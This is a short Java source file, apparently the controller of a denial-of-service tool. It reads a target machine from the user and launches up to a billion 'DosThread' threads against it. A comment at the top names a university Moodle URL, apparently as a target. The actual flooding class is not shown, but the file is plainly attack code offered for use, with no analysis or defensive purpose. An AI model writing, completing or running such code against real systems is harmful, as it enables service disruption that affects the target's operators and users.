//https://moodlelms.eelu.edu.eg
import tui.GetData;

import java.util.Scanner;
public class MainController {
    private Scanner input;
    static String TargetMachine = "";
    public MainController() throws Exception {
        takeInput();
        attack();
        GetData.init();
    }
    public void takeInput() {
        input = new Scanner(System.in);
        System.out.println("Enter the target machine: ");
        TargetMachine = input.nextLine();
    }
    private void attack() throws Exception {
        for (int i =0 ; i<1000000000; i++){
            System.out.println("Attaking ("+i+") for"+ TargetMachine);
            DosThread ddosThread= new DosThread();
            ddosThread.start();
        }
    }

}
